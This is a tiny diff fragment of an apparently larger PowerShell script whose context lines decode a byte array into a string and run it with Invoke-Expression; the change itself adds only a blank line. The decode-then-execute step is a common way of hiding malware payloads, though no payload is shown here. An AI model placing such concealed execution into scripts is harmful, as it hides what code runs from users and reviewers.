@@ -7,3 +7,4 @@ foreach ($byte in $bytes) {
 }
 $script = [System.Text.Encoding]::UTF8.GetString([byte[]]$decoded)
 Invoke-Expression $script
+
